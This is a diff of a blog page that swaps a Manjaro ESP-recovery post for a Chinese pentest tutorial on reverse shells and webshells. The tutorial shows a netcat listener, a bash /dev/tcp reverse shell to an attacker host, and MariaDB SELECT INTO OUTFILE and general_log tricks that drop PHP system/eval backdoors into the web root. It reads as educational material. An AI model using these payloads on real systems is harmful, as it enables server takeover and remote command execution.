@@ -19,27 +19,25 @@
   <meta name="author" content="Artibix">
   <meta name="keywords" content="">
   
-    <meta name="description" content="旧文整理：Manjaro + Windows 双系统，在 Windows 上误删除了 Linux 的 ESP 分区，开机只识别到 Windows 的解决方法。">
+    <meta name="description" content="旧文整理：WebShell（网络后门）通过 Web 服务器获取控制权限；反弹 Bash 通过主动连接攻击者的主机来建立一个交互式的 Shell 会话。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="双系统恢复删除的 Linux ESP 分区">
-<meta property="og:url" content="https://artibix.github.io/restore-manjaro-esp/index.html">
+<meta property="og:title" content="获取 WebShell 和反弹 Bash">
+<meta property="og:url" content="https://artibix.github.io/reverse-shell/index.html">
 <meta property="og:site_name" content="Artibix&#39;s Blogs">
-<meta property="og:description" content="旧文整理：Manjaro + Windows 双系统，在 Windows 上误删除了 Linux 的 ESP 分区，开机只识别到 Windows 的解决方法。">
+<meta property="og:description" content="旧文整理：WebShell（网络后门）通过 Web 服务器获取控制权限；反弹 Bash 通过主动连接攻击者的主机来建立一个交互式的 Shell 会话。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://artibix.github.io/img/cover_manjaro.png">
-<meta property="article:published_time" content="2020-08-07T14:00:00.000Z">
-<meta property="article:modified_time" content="2024-10-12T01:33:08.924Z">
+<meta property="og:image" content="https://artibix.github.io/img/cover_reverse_shell.jpg">
+<meta property="article:published_time" content="2021-04-28T14:23:26.000Z">
+<meta property="article:modified_time" content="2024-10-12T02:40:50.956Z">
 <meta property="article:author" content="Artibix">
-<meta property="article:tag" content="Manjaro">
-<meta property="article:tag" content="Windows">
-<meta property="article:tag" content="ESP">
-<meta property="article:tag" content="UEFI">
+<meta property="article:tag" content="nc">
+<meta property="article:tag" content="渗透，Bash">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://artibix.github.io/img/cover_manjaro.png">
+<meta name="twitter:image" content="https://artibix.github.io/img/cover_reverse_shell.jpg">
   
   
   
-  <title>双系统恢复删除的 Linux ESP 分区 - Artibix&#39;s Blogs</title>
+  <title>获取 WebShell 和反弹 Bash - Artibix&#39;s Blogs</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -205,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="双系统恢复删除的 Linux ESP 分区"></span>
+            <span id="subtitle" data-typed-text="获取 WebShell 和反弹 Bash"></span>
           
         </div>
 
@@ -216,8 +214,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2020-08-07 22:00" pubdate>
-          2020年8月7日 晚上
+        <time datetime="2021-04-28 22:23" pubdate>
+          2021年4月28日 晚上
         </time>
       </span>
     
@@ -228,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          791 字
+          810 字
         
       </span>
     
@@ -276,120 +274,109 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">双系统恢复删除的 Linux ESP 分区</h1>
+            <h1 id="seo-header">获取 WebShell 和反弹 Bash</h1>
             
             
               <div class="markdown-body">
                 
-                <p>旧文整理：Manjaro + Windows 双系统，在 Windows 上误删除了 Linux 的 ESP 分区，开机只识别到 Windows 的解决方法。</p>
+                <p>旧文整理：WebShell（网络后门）通过 Web 服务器获取控制权限；反弹 Bash 通过主动连接攻击者的主机来建立一个交互式的 Shell 会话。</p>
 <span id="more"></span>
 
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我是 Manjaro + Widnwos 双系统，其他系统也可以试一试。一般这种情况我建议备份数据直接重装。不过嘛，在我不断折腾下还是找到了恢复 ESP 的方法。在此之前，先简单介绍下 ESP 这个东西。</p>
-<h2 id="ESP"><a href="#ESP" class="headerlink" title="ESP"></a>ESP</h2><p>ESP 是 EFI System Partition 的缩写，即 EFI 系统分区。它是一个特殊的磁盘分区，主要用于支持 UEFI 固件的启动。</p>
-<p>ESP 分区的格式一般是 FAT32，UEFI 通过读取 ESP 上的配置信息去加载 OS 的内核，从而启动操作系统。</p>
-<h2 id="BIOS-和-UEFI-的区别"><a href="#BIOS-和-UEFI-的区别" class="headerlink" title="BIOS 和 UEFI 的区别"></a>BIOS 和 UEFI 的区别</h2><h3 id="功能方面"><a href="#功能方面" class="headerlink" title="功能方面"></a>功能方面</h3><table>
-<thead>
-<tr>
-<th>区别</th>
-<th>传统 BIOS</th>
-<th>UEFI</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>分区表</td>
-<td>使用主引导记录 (MBR)</td>
-<td>使用全局唯一标识分区表 (GPT)</td>
-</tr>
-<tr>
-<td>存储位置</td>
-<td>主板的 BIOS 芯片</td>
-<td>EFI</td>
-</tr>
-<tr>
-<td>运行模式</td>
-<td>16 位</td>
-<td>64 位</td>
-</tr>
-<tr>
-<td>安全性</td>
-<td>相对较低</td>
-<td>支持安全启动</td>
-</tr>
-<tr>
-<td>用户界面</td>
-<td>只能键盘导航的简单界面</td>
-<td>可以联网更新的复杂界面</td>
-</tr>
-</tbody></table>
-<h3 id="启动流程"><a href="#启动流程" class="headerlink" title="启动流程"></a>启动流程</h3><p>BIOS：自检 -&gt; 查找启动设备（硬盘） -&gt; 将 MBR 加载进内存 -&gt; 启动操作系统</p>
-<p>UEFI：初始化设备 -&gt; 查找启动设备 -&gt; 加载 EFI（在 ESP 里面）进内存 -&gt; 启动操作系统</p>
-<h2 id="恢复分区"><a href="#恢复分区" class="headerlink" title="恢复分区"></a>恢复分区</h2><p>OK，介绍完毕，正事开干</p>
-<h3 id="制作-livecd-U-盘启动盘"><a href="#制作-livecd-U-盘启动盘" class="headerlink" title="制作 livecd (U 盘启动盘)"></a>制作 livecd (U 盘启动盘)</h3><p>下载镜像</p>
+<h2 id="反弹-BASH"><a href="#反弹-BASH" class="headerlink" title="反弹 BASH"></a>反弹 BASH</h2><p>与 SSH 的区别在于，可以让目标主机主动连接黑客的主机，从而绕过防火墙的限制。</p>
+<h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><p>最常用的反弹 Bash 方式是利用 nc（netcat）工具，黑客在自己电脑上监听端口</p>
+<figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token operator">&lt;</span> 端口 <span class="token operator">></span></code></pre></div></figure>
+
 <ul>
-<li><a target="_blank" rel="noopener" href="https://manjaro.org/">Manjaro 官网</a> 下载 iso 镜像文件</li>
+<li><code>-l</code>: 监听模式。</li>
+<li><code>-v</code>: 显示详细的信息。</li>
+<li><code>-n</code>: 不进行域名解析。</li>
+<li><code>-p &lt; 端口 &gt;</code>: 监听的端口号。</li>
+</ul>
+<p>在目标主机执行</p>
+<figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/<span class="token operator">&lt;</span> 攻击者 IP<span class="token operator">></span>/<span class="token operator">&lt;</span> 端口 <span class="token operator">></span> <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre></div></figure>
+
+<ul>
+<li><p><code>-i</code>: 交互式 shell</p>
+</li>
+<li><p><code>&amp;&gt;</code>: 将标准输出和错误进行重定向</p>
+</li>
+<li><p><code>/dev/tcp/ip/port</code>: bash 建立 socket 的一种特殊写法，除此之外还有 udp</p>
+</li>
+<li><p><code>&lt;&amp;1</code>: 把标准输入重定向到标准输出，其他写法 <code>0&gt;&amp;1</code></p>
+</li>
 </ul>
 <div class="note note-primary">
-            <p>下载太慢可以去 <a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/osdn/storage/g/m/ma/manjaro/">清华镜像站</a> 下载</p>
+            <p>什么？你要问我都能连接到靶机执行指令了还要什么 nc？哼哼，黑客通常是使用各种漏洞连接到靶机，使用 nc 只是为了更方便的执行系统指令。</p><p>比如利用数据库漏洞执行 nc 反弹 bash</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash">system <span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'bash -i &amp;> /dev/tcp/&#123;外部机器 IP&#125;/&#123;端口&#125; &lt;&amp;1'</span></code></pre></div></figure>
           </div>
 
-<p>制作启动盘</p>
-<ul>
-<li><p>Windows，使用 <a target="_blank" rel="noopener" href="https://github.com/pbatard/rufus/tree/master/src">rufus</a> 工具向 U 盘写入镜像。</p>
-</li>
-<li><p>Linux，使用 dd 指令。</p>
-</li>
-</ul>
-<figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 示例</span>
-<span class="token function">sudo</span> <span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>manjaro.iso <span class="token assign-left variable">of</span><span class="token operator">=</span>/dev/sdb <span class="token assign-left variable">bs</span><span class="token operator">=</span>4M <span class="token assign-left variable">status</span><span class="token operator">=</span>progress</code></pre></div></figure>
+<h2 id="Web-Shell"><a href="#Web-Shell" class="headerlink" title="Web Shell"></a>Web Shell</h2><p>利用 Web 服务器漏洞执行 shell 指令，下面演示利用 PHP + MariaDB 写入一个后门文件。</p>
+<h3 id="利用-secure-file-priv"><a href="#利用-secure-file-priv" class="headerlink" title="利用 secure_file_priv"></a>利用 secure_file_priv</h3><p>主要用于限制数据库对文件系统的访问。它规定 MySQL 服务器可以进行文件导入导出操作的目录。</p>
+<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'% secure%'</span>
+<span class="token operator">|</span> Variable_name            <span class="token operator">|</span> <span class="token keyword">Value</span>   <span class="token operator">|</span>
+<span class="token operator">|</span><span class="token comment">--------------------------|---------|</span>
+<span class="token operator">|</span> require_secure_transport <span class="token operator">|</span> <span class="token keyword">OFF</span>     <span class="token operator">|</span>
+<span class="token operator">|</span> secure_auth              <span class="token operator">|</span> <span class="token keyword">ON</span>      <span class="token operator">|</span>
+<span class="token operator">|</span> secure_file_priv         <span class="token operator">|</span>         <span class="token operator">|</span>
+<span class="token operator">|</span> secure_timestamp         <span class="token operator">|</span> <span class="token keyword">NO</span>      <span class="token operator">|</span></code></pre></div></figure>
 
 <ul>
-<li>Android，使用 Termux 的 dd 指令。（没尝试过）</li>
+<li>空字符串（’’）： 不限制导入导出目录，MySQL 可以在任意目录进行文件操作。</li>
+<li>指定目录： 只能在指定的目录进行导入导出操作。例如：secure_file_priv&#x3D;’&#x2F;var&#x2F;lib&#x2F;mysql’</li>
+<li>NULL： 禁止所有的文件导入导出操作，包括 LOAD DATA INFILE、SELECT … INTO OUTFILE 和 LOAD_FILE () 函数。</li>
 </ul>
-<h3 id="进入-livecd"><a href="#进入-livecd" class="headerlink" title="进入 livecd"></a>进入 livecd</h3><p>将 U 盘插入需要修复的电脑，进入 BIOS，选择 U 盘启动，进入临时的 Manjaro 系统。</p>
-<h3 id="挂载-chroot"><a href="#挂载-chroot" class="headerlink" title="挂载 &amp; chroot"></a>挂载 &amp; chroot</h3><p>打开终端输入以下指令自动挂载电脑上的 Manjaro 操作系统，自动 chroot.</p>
-<figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> manjaro-chroot <span class="token parameter variable">-a</span>
+<p>然后查看用户是否具有 IO 权限</p>
+<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> group_concat <span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>file_priv<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">;</span></code></pre></div></figure>
 
-<span class="token comment">## 正常情况等待提示输入 '1' 即可</span></code></pre></div></figure>
+<p>执行代码将后门输出到服务器</p>
+<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">"&lt;?php @system ($_GET ['cmd']);?>"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/srv/http/houmen.php'</span><span class="token punctuation">;</span></code></pre></div></figure>
+
+<p>接下来就可以利用这个文件为所欲为啦</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/webshell.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="利用-general-log"><a href="#利用-general-log" class="headerlink" title="利用 general_log"></a>利用 general_log</h3><p>如果上面的 <code>secure_file_priv</code> 规定了输出目录或者是 NULL，还可以使用 <code>general_log</code> 的方法来写 shell，它记录所有基础日志，默认关闭状态。</p>
+<ol>
+<li>模糊查找关于 general 的信息</li>
+</ol>
+<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'% general%'</span>
+<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> <span class="token keyword">Value</span>            <span class="token operator">|</span>
+<span class="token operator">|</span><span class="token comment">------------------|------------------|</span>
+<span class="token operator">|</span> general_log      <span class="token operator">|</span> <span class="token keyword">OFF</span>              <span class="token operator">|</span>
+<span class="token operator">|</span> general_log_file <span class="token operator">|</span>                  <span class="token operator">|</span></code></pre></div></figure>
+
+<ol start="2">
+<li>开启 general_log，设置路径</li>
+</ol>
+<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file <span class="token operator">=</span> <span class="token string">'/srv/http/hm.php'</span><span class="token punctuation">;</span>
+MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'% general%'</span>
+<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> <span class="token keyword">Value</span>            <span class="token operator">|</span>
+<span class="token operator">|</span><span class="token comment">------------------|------------------|</span>
+<span class="token operator">|</span> general_log      <span class="token operator">|</span> <span class="token keyword">ON</span>               <span class="token operator">|</span>
+<span class="token operator">|</span> general_log_file <span class="token operator">|</span> <span class="token operator">/</span>srv<span class="token operator">/</span>http<span class="token operator">/</span>hm<span class="token punctuation">.</span>php <span class="token operator">|</span></code></pre></div></figure>
+
+<ol start="3">
+<li>写入数据</li>
+</ol>
+<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">"&lt;?php @eval ($_GET ['command']);?>"</span></code></pre></div></figure>
+
+<figure><div class="code-wrapper"><pre class="language-php" data-language="php"><code class="language-php">> sudo cat /srv/http/hm.php
+/usr/bin/mariadbd, Version: 10.5.9-MariaDB (Arch Linux). started with:
+Tcp port: 3306  Unix socket: /run/mysqld/mysqld.sock
+Time                Id Command  Argument
+210429 17:29:36      3 Query    select "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">system</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>"</code></pre></div></figure>
 
 <div class="note note-danger">
-            <p>注意，如果是格式化 esp 分区 (uuid 发生变化), 会导致格式化的分区不能自动挂载，有两种解决方案</p><ol><li>进入 chroot 后修改 &#x2F;etc&#x2F;fstab 修改格式化分区 uuid 后再次使用上述指令</li><li>尝试手动挂载 linux 系统所在分区</li></ol>
+            <p>如果数据库用户权限被严格管控了 IO，那么将无法实现上述步骤，比如在 Linux 里面，httpd 的用户是 http，mariadb 的用户是 mysql，默认情况下，mysql 无法写入，httpd 无法读取</p>
           </div>
 
-<p>因为我是格式化的 esp 分区，不能自动挂载上 efi 分区，我尝试的是手动挂载，下面是我我挂载的分区</p>
-<figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash">/dev/nvme0n1p7  --<span class="token operator">></span> /mnt/Manjaro/
-/dev/nvme0n1p6  --<span class="token operator">></span> /mnt/Manjaro/boot/
-Restore_the_GRUB_Bootloader/dev/nvme0n1p8 --<span class="token operator">></span> /mnt/Manjaro/home/
-/dev/nvme0n1p9  --<span class="token operator">></span> /mnt/Manjaro/boot/efi/</code></pre></div></figure>
-
-<p>手动挂载还需要输入以下指令</p>
-<figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> proc proc /mnt/proc
-<span class="token function">sudo</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs sys /mnt/sys
-<span class="token function">sudo</span> <span class="token function">mount</span> <span class="token parameter variable">-o</span> <span class="token builtin class-name">bind</span> /dev/mnt/dev
-<span class="token function">sudo</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> devpts pts /mnt/dev/pts/
-<span class="token function">sudo</span> modprobe efivarfs
-<span class="token function">sudo</span> <span class="token function">chroot</span> /mnt
-<span class="token function">mount</span> <span class="token parameter variable">-t</span> efivarfs efivarfs /sys/firmware/efi/efivars</code></pre></div></figure>
-
-<div class="note note-info">
-            <p>挂载好后别忘了 <code>sudo manjaro-chroot -a</code></p>
-          </div>
-
-<h3 id="重装并更新-grub"><a href="#重装并更新-grub" class="headerlink" title="重装并更新 grub"></a>重装并更新 grub</h3><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> grub-install <span class="token parameter variable">--target</span><span class="token operator">=</span>x86_64-efi --efi-directory<span class="token operator">=</span>/boot/efi --bootloader-id<span class="token operator">=</span>manjaro <span class="token parameter variable">--recheck</span>
-<span class="token function">sudo</span> <span class="token function">update-grub</span>
-<span class="token comment"># 提示 ' 未知的设备 nvme0n1' 不用管他</span></code></pre></div></figure>
-
-<p>如果上述指令无误的话就可以重启了.</p>
-<p>进入系统后再次输入 <code>update-grub</code>, grub 会识别到电脑的其他系统，开机才会出现 grub 多重引导.</p>
-<div class="note note-info">
-            <p>如果出现超时无法进入系统，注意修改 &#x2F;etc&#x2F;fstab 文件里面 ESP 的 UUID</p>
-          </div>
-
-
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
-<li><p><a target="_blank" rel="noopener" href="https://wiki.manjaro.org/index.php?title=Restore_the_GRUB_Bootloader">Restore_the_GRUB_Bootloader</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="http://linux.vbird.org/linux_basic/0510osloader.php#process_1">第十九章、开机流程、模组管理与 Loader</a></p>
-</li>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>后端只要满足三个条件就可以反弹 shell</p>
+<ul>
+<li>支持 tcp 链接</li>
+<li>支持 IO 重定向</li>
+<li>可以调用系统命令</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.ascotbe.com/2020/07/21/DatabaseWriteWebshell/#post-comment">常见数据库写入 Webshell 汇总</a></li>
+<li><a target="_blank" rel="noopener" href="https://becivells.github.io/2019/01/bash_i_dev_tcp/">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;localhost&#x2F;8080 0&gt;&amp;1 的含义</a></li>
 </ul>
 
                 
@@ -409,7 +396,7 @@ Restore_the_GRUB_Bootloader/dev/nvme0n1p8 --<span class="token operator">></span
     
       <span class="category-chain">
         
-  <a href="/categories/OS/" class="category-chain-item">OS</a>
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
   
   
 
@@ -424,13 +411,9 @@ Restore_the_GRUB_Bootloader/dev/nvme0n1p8 --<span class="token operator">></span
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/Manjaro/" class="print-no-link">#Manjaro</a>
+        <a href="/tags/nc/" class="print-no-link">#nc</a>
       
-        <a href="/tags/Windows/" class="print-no-link">#Windows</a>
-      
-        <a href="/tags/ESP/" class="print-no-link">#ESP</a>
-      
-        <a href="/tags/UEFI/" class="print-no-link">#UEFI</a>
+        <a href="/tags/%E6%B8%97%E9%80%8F%EF%BC%8CBash/" class="print-no-link">#渗透，Bash</a>
       
     </div>
   
@@ -442,8 +425,8 @@ Restore_the_GRUB_Bootloader/dev/nvme0n1p8 --<span class="token operator">></span
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>双系统恢复删除的 Linux ESP 分区</div>
-      <div>https://artibix.github.io/restore-manjaro-esp/</div>
+      <div>获取 WebShell 和反弹 Bash</div>
+      <div>https://artibix.github.io/reverse-shell/</div>
     </div>
     <div class="license-meta">
       
@@ -455,7 +438,7 @@ Restore_the_GRUB_Bootloader/dev/nvme0n1p8 --<span class="token operator">></span
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2020年8月7日</div>
+          <div>2021年4月28日</div>
         </div>
       
       
@@ -487,18 +470,12 @@ Restore_the_GRUB_Bootloader/dev/nvme0n1p8 --<span class="token operator">></span
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/wake-on-lan/" title="Manjaro + 微星 B365M 主板设置 Wake On Lan">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Manjaro + 微星 B365M 主板设置 Wake On Lan</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/tools-ascii-draw/" title="盘点 ASCII 字符绘图工具">
-                        <span class="hidden-mobile">盘点 ASCII 字符绘图工具</span>
+                      <a href="/wake-on-lan/" title="Manjaro + 微星 B365M 主板设置 Wake On Lan">
+                        <span class="hidden-mobile">Manjaro + 微星 B365M 主板设置 Wake On Lan</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
